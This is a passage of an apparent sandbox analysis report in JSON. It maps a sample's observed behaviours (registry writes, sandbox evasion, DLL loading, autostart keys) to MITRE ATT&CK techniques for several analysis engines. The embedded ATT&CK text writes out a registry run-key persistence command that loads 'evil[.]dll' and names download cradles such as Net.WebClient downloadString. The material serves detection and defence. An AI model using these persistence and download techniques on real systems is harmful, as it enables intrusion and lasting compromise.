via Disable or Modify Tools.", "signatures": [{"severity": "MEDIUM", "description": "(Process #1) installshield setup.exe hides thread via API \"NtSetInformationThread\"."}]}]}, {"id": "TA0003", "name": "Persistence", "link": "https://attack.mitre.org/tactics/TA0003/", "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ", "techniques": [{"id": "T1112", "name": "Modify Registry", "link": "https://attack.mitre.org/techniques/T1112/", "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\nThe Registry may be modified in order to hide configuration information or malicious payloads via Obfuscated Files or Information. The Registry may also be modified to Impair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.", "signatures": [{"severity": "INFO", "description": "(Process #5) te.exe hides 393824 bytes in \"HKEY_CURRENT_USER\\Console\\0\\32af87c1e3d8531abcb9fc927688e14e\"."}]}]}]}, "Yomi Hunter": {"tactics": [{"id": "TA0002", "name": "Execution", "link": "https://attack.mitre.org/tactics/TA0002/", "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ", "techniques": [{"id": "T1129", "name": "Shared Modules", "link": "https://attack.mitre.org/techniques/T1129/", "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.", "signatures": [{"severity": "UNKNOWN", "description": "The process attempted to dynamically load a malicious function"}, {"severity": "UNKNOWN", "description": "The process tried to load dynamically one or more functions."}]}]}, {"id": "TA0003", "name": "Persistence", "link": "https://attack.mitre.org/tactics/TA0003/", "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ", "techniques": [{"id": "T1198", "name": "SIP and Trust Provider Hijacking", "link": "https://attack.mitre.org/techniques/T1198/", "description": "In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. \nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs). \nSimilar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: \n\nModifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP  (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\nModifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID} that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\nModifying the DLL and Function Registry values in HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{trust provider GUID} that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\nNote: The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. ", "signatures": [{"severity": "UNKNOWN", "description": "The binary has an Authenticode signature"}, {"severity": "UNKNOWN", "description": "The file have a Trusted Certificate"}]}, {"id": "T1112", "name": "Modify Registry", "link": "https://attack.mitre.org/techniques/T1112/", "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\nThe Registry may be modified in order to hide configuration information or malicious payloads via Obfuscated Files or Information. The Registry may also be modified to Impair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.", "signatures": [{"severity": "UNKNOWN", "description": "Detected an attempt to write registry keys related to the proxy settings"}]}]}, {"id": "TA0005", "name": "Defense Evasion", "link": "https://attack.mitre.org/tactics/TA0005/", "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ", "techniques": [{"id": "T1198", "name": "SIP and Trust Provider Hijacking", "link": "https://attack.mitre.org/techniques/T1198/", "description": "In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. \nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs). \nSimilar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: \n\nModifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP  (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\nModifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID} that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\nModifying the DLL and Function Registry values in HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{trust provider GUID} that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\nNote: The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. ", "signatures": [{"severity": "UNKNOWN", "description": "The binary has an Authenticode signature"}, {"severity": "UNKNOWN", "description": "The file have a Trusted Certificate"}]}, {"id": "T1045", "name": "Software Packing", "link": "https://attack.mitre.org/techniques/T1045/", "description": "Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.\nAdversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.", "signatures": [{"severity": "UNKNOWN", "description": "Manalize Local SandBox Packer Harvesting"}]}, {"id": "T1089", "name": "Disabling Security Tools", "link": "https://attack.mitre.org/techniques/T1089/", "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.", "signatures": [{"severity": "UNKNOWN", "description": "The process has tried to suspend a sandbox-related thread (possible sandbox evasion attempt)"}]}, {"id": "T1112", "name": "Modify Registry", "link": "https://attack.mitre.org/techniques/T1112/", "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\nThe Registry may be modified in order to hide configuration information or malicious payloads via Obfuscated Files or Information. The Registry may also be modified to Impair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.", "signatures": [{"severity": "UNKNOWN", "description": "Detected an attempt to write registry keys related to the proxy settings"}]}, {"id": "T1116", "name": "Code Signing", "link": "https://attack.mitre.org/techniques/T1116/", "description": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries . The certificates used during an operation may be created, forged, or stolen by the adversary.  \nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. \nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.", "signatures": [{"severity": "UNKNOWN", "description": "The binary has an invalid Authenticode signature."}]}]}, {"id": "TA0011", "name": "Command and Control", "link": "https://attack.mitre.org/tactics/TA0011/", "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim\u2019s network structure and defenses.", "techniques": [{"id": "T1071", "name": "Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1071/", "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ", "signatures": [{"severity": "UNKNOWN", "description": "Detected one or more anomalous HTTP requests"}, {"severity": "UNKNOWN", "description": "Detected HTTP requests to some non white-listed domains"}, {"severity": "UNKNOWN", "description": "Dropping suspicious files"}]}, {"id": "T1105", "name": "Ingress Tool Transfer", "link": "https://attack.mitre.org/techniques/T1105/", "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.  A number of these tools, such as wget, curl, and scp, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via certutil -hashfile).\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows search-ms protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "signatures": [{"severity": "UNKNOWN", "description": "Dropping suspicious files"}]}]}, {"id": "TA0007", "name": "Discovery", "link": "https://attack.mitre.org/tactics/TA0007/", "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what\u2019s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ", "techniques": [{"id": "T1082", "name": "System Information Discovery", "link": "https://attack.mitre.org/techniques/T1082/", "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). On ESXi servers, threat actors may gather system information from various esxcli utilities, such as system hostname get, system version get, and storage filesystem list (to list storage volumes).\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.\nSystem Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment. ", "signatures": [{"severity": "UNKNOWN", "description": "Queries for the computername"}]}]}, {"id": "TA0009", "name": "Collection", "link": "https://attack.mitre.org/tactics/TA0009/", "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.", "techniques": [{"id": "T1185", "name": "Browser Session Hijacking", "link": "https://attack.mitre.org/techniques/T1185/", "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights.\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.", "signatures": [{"severity": "UNKNOWN", "description": "Detected an attempt to write registry keys related to the proxy settings"}]}]}]}, "Zenbox": {"tactics": [{"id": "TA0001", "name": "Initial Access", "link": "https://attack.mitre.org/tactics/TA0001/", "description": "The adversary is trying to get into your network.\n\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.", "techniques": [{"id": "T1091", "name": "Replication Through Removable Media", "link": "https://attack.mitre.org/techniques/T1091/", "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\nMobile devices may also be used to infect PCs with malware if connected via USB. This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).", "signatures": [{"severity": "INFO", "description": "Checks for available system drives (often done to infect USB drives)", "match_data": ["z:", "x:", "v:", "t:", "r:", "p:", "n:", "l:", "j:", "h:", "f:", "d:", "b:", "y:", "w:", "u:", "s:", "q:", "o:", "m:", "k:", "i:", "g:", "e:", "c:", "[:"]}]}]}, {"id": "TA0008", "name": "Lateral Movement", "link": "https://attack.mitre.org/tactics/TA0008/", "description": "The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. ", "techniques": [{"id": "T1091", "name": "Replication Through Removable Media", "link": "https://attack.mitre.org/techniques/T1091/", "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\nMobile devices may also be used to infect PCs with malware if connected via USB. This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).", "signatures": [{"severity": "INFO", "description": "Checks for available system drives (often done to infect USB drives)", "match_data": ["z:", "x:", "v:", "t:", "r:", "p:", "n:", "l:", "j:", "h:", "f:", "d:", "b:", "y:", "w:", "u:", "s:", "q:", "o:", "m:", "k:", "i:", "g:", "e:", "c:", "[:"]}]}]}, {"id": "TA0003", "name": "Persistence", "link": "https://attack.mitre.org/tactics/TA0003/", "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ", "techniques": [{"id": "T1547", "name": "Boot or Logon Autostart Execution", "link": "https://attack.mitre.org/techniques/T1547/", "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges."}, {"id": "T1547.001", "name": "Registry Run Keys / Startup Folder", "link": "https://attack.mitre.org/techniques/T1547/001/", "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.", "signatures": [{"severity": "LOW", "description": "Creates an undocumented autostart registry key", "match_data": ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders Startup"]}]}, {"id": "T1574", "name": "Hijack Execution Flow", "link": "https://attack.mitre.org/techniques/T1574/", "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."}, {"id": "T1574.002", "name": "DLL Side-Loading", "link": "https://attack.mitre.org/techniques/T1574/002/", "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.", "signatures": [{"severity": "INFO", "description": "Tries to load missing DLLs", "match_data": ["apphelp.dll", "wininet.dll", "cryptbase.dll", "windows.storage.dll", "wintypes.dll", "kernel.appcore.dll", "uxtheme.dll", "iertutil.dll", "sspicli.dll", "profapi.dll", "ondemandconnroutehelper.dll", "mswsock.dll", "iphlpapi.dll", "winhttp.dll", "winnsi.dll", "urlmon.dll", "srvcli.dll", "netutils.dll", "propsys.dll", "cfgmgr32.dll", "linkinfo.dll", "ntshrui.dll", "cscapi.dll", "sxs.dll", "onecorecommonproxystub.dll", "onecoreuapcommonproxystub.dll", "windows.staterepositoryps.dll", "appresolver.dll", "userenv.dll", "bcp47langs.dll", "twext.dll", "twinapi.appcore.dll", "windows.fileexplorer.common.dll", "textshaping.dll", "policymanager.dll", "msvcp110_win.dll", "cryptsp.dll", "rsaenh.dll", "bcrypt.dll", "secur32.dll", "version.dll", "wtsapi32.dll", "starttiledata.dll", "acppage.dll", "sfc.dll", "sfc_os.dll", "servicingcommon.dll", "edputil.dll", "virtdisk.dll", "wldp.dll", "smartscreenps.dll", "shdocvw.dll", "msasn1.dll", "winmm.dll", "napinsp.dll", "pnrpnsp.dll", "dnsapi.dll", "winrnr.dll", "wshbth.dll", "nlansp_c.dll", "fwpuclnt.dll", "rasadhlp.dll", "dxgi.dll", "dinput8.dll", "inputhost.dll", "coremessaging.dll", "dxcore.dll", "resourcepolicyclient.dll", "directxdatabasehelper.dll", "devenum.dll", "ntmarta.dll", "devobj.dll", "msdmo.dll", "avicap32.dll", "msvfw32.dll", "windows.staterepositorycore.dll", "windowscodecs.dll", "msvcp140.dll", "vcruntime140_1.dll", "vcruntime140.dll", "uiautomationcore.dll", "msvcp140_1.dll", "d2d1.dll", "dwrite.dll", "d3dcompiler_47.dll", "d3d11.dll"]}]}, {"id": "T1112", "name": "Modify Registry", "link": "https://attack.mitre.org/techniques/T1112/", "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote 